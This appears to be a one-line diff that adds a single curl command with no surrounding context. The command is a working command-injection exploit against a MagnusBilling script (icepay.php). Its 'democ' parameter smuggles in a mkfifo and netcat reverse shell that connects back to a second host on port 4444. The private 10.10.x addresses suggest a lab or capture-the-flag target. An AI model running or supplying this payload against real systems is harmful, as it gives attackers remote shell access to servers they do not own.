@@ -1,0 +1,1 @@
+curl -s 'http://10.10.241.115/mbilling/lib/icepay/icepay.php' --get --data-urlencode 'democ=;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.204.85 4444 >/tmp/f;'
